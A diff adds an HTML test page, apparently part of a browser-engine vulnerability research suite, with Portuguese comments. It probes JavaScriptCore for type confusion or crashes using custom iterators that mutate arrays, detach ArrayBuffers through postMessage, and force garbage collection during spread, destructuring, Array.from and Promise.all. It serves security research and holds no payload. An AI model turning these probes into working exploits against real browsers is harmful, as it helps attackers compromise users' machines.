@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>TEST 13 - Iterator Protocol Abuse</title></head>
+<body>
+<h2>TEST 13 - Iterator Protocol com Side-Effects</h2>
+<p>Alvo: type confusion / crash via iteradores customizados com side-effects em spread, destructuring e for..of</p>
+<p>API: Symbol.iterator, Spread operator, Destructuring, Array.from, Promise.all</p>
+<p>Tecnica: iterador retorna numero de itens diferente do length declarado, ou muda tipo do objeto
+durante iteracao. Motor JSC pode ter caminhos otimizados que nao re-checam tipos apos cada next().</p>
+
+<pre id="log">Aguardando...</pre>
+<button onclick="testSpreadMutation()">SPREAD + MUTACAO</button>
+<button onclick="testDestructureRace()">DESTRUCTURE RACE</button>
+<button onclick="testArrayFrom()">ARRAY.FROM ABUSE</button>
+<button onclick="testPromiseAllIter()">PROMISE.ALL ITERATOR</button>
+
+<script>
+var log = document.getElementById('log');
+function append(msg) { log.textContent += '\n' + msg; }
+
+function forceGC() {
+  var t = [];
+  for (var i = 0; i < 30000; i++) t.push({a:i});
+  t = null;
+}
+
+function testSpreadMutation() {
+  append('[13] Spread operator com iterador que muda o objeto origem durante iteracao...');
+  try {
+    var data = [1.1, 2.2, 3.3, 4.4, 5.5];
+    var iterCount = 0;
+    var mutated = false;
+
+    // Objeto com iterador customizado que muta 'data' na metade
+    var iterable = {
+      [Symbol.iterator]: function() {
+        iterCount = 0;
+        return {
+          next: function() {
+            if (iterCount === 3 && !mutated) {
+              mutated = true;
+              // Mudar tipo do array durante spread
+              data.push({evil: true}); // ArrayWithDoubles -> ArrayWithContiguous
+              data[0] = "agora sou string"; // Int/Double -> object
+              forceGC();
+              append('[13] Mutacao executada no next() #3 | data[0]=' + typeof data[0]);
+            }
+            if (iterCount < data.length) {
+              return { value: data[iterCount++], done: false };
+            }
+            return { value: undefined, done: true };
+          }
+        };
+      }
+    };
+
+    // Spread do iterador customizado
+    var spread = [...iterable];
+    append('[13] Spread result: ' + spread.join(', '));
+    append('[13] spread.length: ' + spread.length);
+    append('[13] data apos mutacao: ' + data);
+
+    // Funcao JIT-compilada que assume spread contem doubles
+    function sumSpread(arr) {
+      var s = 0.0;
+      for (var i = 0; i < arr.length; i++) s += arr[i];
+      return s;
+    }
+    for (var i = 0; i < 50000; i++) sumSpread([1.1,2.2,3.3]);
+    var r = sumSpread(spread); // spread pode ter tipos misturados
+    append('[13] sumSpread(spread) em funcao JIT: ' + r);
+
+  } catch(e) {
+    append('[13] Spread mutation EXCECAO: ' + e.message);
+  }
+}
+
+function testDestructureRace() {
+  append('[13] Destructuring com side-effect no iterador...');
+  try {
+    var shared = { val: 1.337, buf: new ArrayBuffer(64) };
+
+    var evilIter = {
+      pos: 0,
+      [Symbol.iterator]: function() { return this; },
+      next: function() {
+        this.pos++;
+        if (this.pos === 2) {
+          // Transferir buffer durante destructuring - cria detached buffer
+          postMessage('', '*', [shared.buf]);
+          shared.buf = new ArrayBuffer(64); // substituir
+          forceGC();
+          append('[13] Buffer transferido/substituido na posicao 2 do destructuring');
+        }
+        if (this.pos <= 4) {
+          return { value: shared.buf, done: false };
+        }
+        return { value: undefined, done: true };
+      }
+    };
+
+    // Destructuring - cada slot recebe o valor do next()
+    var [a, b, c, d] = evilIter;
+    append('[13] a.byteLength: ' + (a ? a.byteLength : 'null'));
+    append('[13] b.byteLength: ' + (b ? b.byteLength : 'null')); // pode ser o transferido (byteLength=0)
+    append('[13] c.byteLength: ' + (c ? c.byteLength : 'null'));
+    append('[13] d.byteLength: ' + (d ? d.byteLength : 'null'));
+
+    // a e b deveriam ser o mesmo buffer mas b pode estar detachado
+    append('[13] a === b (mesma ref)? ' + (a === b));
+    append('[13] a === c? ' + (a === c));
+
+    // Tentar usar o buffer detachado (b)
+    try {
+      var view = new Uint32Array(b);
+      append('[13] Uint32Array(b) - byteLength=' + b.byteLength + ' view.length=' + view.length);
+    } catch(e2) {
+      append('[13] Uint32Array(b) EXCECAO: ' + e2.message);
+    }
+
+  } catch(e) {
+    append('[13] Destructure race EXCECAO: ' + e.message);
+  }
+}
+
+function testArrayFrom() {
+  append('[13] Array.from com mapFn que tem side-effect...');
+  try {
+    var source = new Float64Array([1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8]);
+    var callIdx = 0;
+
+    // mapFn e chamada para cada elemento - pode ter side-effects
+    var result = Array.from(source, function mapFn(val, idx) {
+      callIdx++;
+      if (callIdx === 4) {
+        // Mudar o source durante o map - JSC pode ter referencia estale
+        source = new Uint8Array([255, 254, 253, 252, 251, 250, 249, 248]);
+        forceGC();
+        append('[13] Array.from: source substituido no idx=' + idx);
+      }
+      return val; // retorna valor do Float64Array original
+    });
+
+    append('[13] Array.from result: ' + result.join(', '));
+    append('[13] result.length: ' + result.length);
+    append('[13] callIdx total: ' + callIdx);
+
+    // Array.from com objeto customizado que muda length durante iteracao
+    var trickSource = {
+      length: 8,
+      0: 1.1, 1: 2.2, 2: 3.3, 3: 4.4, 4: 5.5, 5: 6.6, 6: 7.7, 7: 8.8
+    };
+
+    Object.defineProperty(trickSource, 'length', {
+      get: function() {
+        var l = this._len || 8;
+        this._len = Math.floor(l / 2); // Reduz o length a cada acesso
+        append('[13] trickSource.length getter: retornando ' + l);
+        return l;
+      }
+    });
+
+    var r2 = Array.from(trickSource);
+    append('[13] Array.from(trickSource) length: ' + r2.length + ' | vals: ' + r2.join(', '));
+
+  } catch(e) {
+    append('[13] Array.from EXCECAO: ' + e.message);
+  }
+}
+
+function testPromiseAllIter() {
+  append('[13] Promise.all com iterador customizado malicioso...');
+  try {
+    var resolvers = [];
+    var rejectors = [];
+    var promises = [];
+
+    // Criar promises controladas
+    for (var i = 0; i < 10; i++) {
+      (function() {
+        var p = new Promise(function(res, rej) {
+          resolvers.push(res);
+          rejectors.push(rej);
+        });
+        promises.push(p);
+      })();
+    }
+
+    var iterPos = 0;
+    var totalIter = promises.length;
+
+    // Iterador que resolve promises durante a propria iteracao do Promise.all
+    var evilIterator = {
+      [Symbol.iterator]: function() { return this; },
+      next: function() {
+        if (iterPos < totalIter) {
+          var p = promises[iterPos];
+          var idx = iterPos;
+          iterPos++;
+
+          // Resolver a promise ANTES de entrega-la ao Promise.all
+          // Pode criar race condition na implementacao do Promise.all
+          if (idx % 2 === 0) {
+            resolvers[idx](idx * 100);
+            append('[13] Promise ' + idx + ' resolvida ANTES de ser entregue ao Promise.all');
+          }
+
+          return { value: p, done: false };
+        }
+        return { value: undefined, done: true };
+      }
+    };
+
+    Promise.all(evilIterator).then(function(results) {
+      append('[13] Promise.all resolveu: ' + results.join(', '));
+      append('[13] Promises ainda pendentes: ' + (totalIter - iterPos));
+    }).catch(function(e) {
+      append('[13] Promise.all rejeitou: ' + e);
+    });
+
+    // Resolver as promises impares apos um delay
+    setTimeout(function() {
+      for (var j = 1; j < totalIter; j += 2) {
+        resolvers[j](j * 100);
+      }
+      append('[13] Promises impares resolvidas');
+    }, 100);
+
+  } catch(e) {
+    append('[13] Promise.all iter EXCECAO: ' + e.message);
+  }
+}
+</script>
+</body>
+</html>
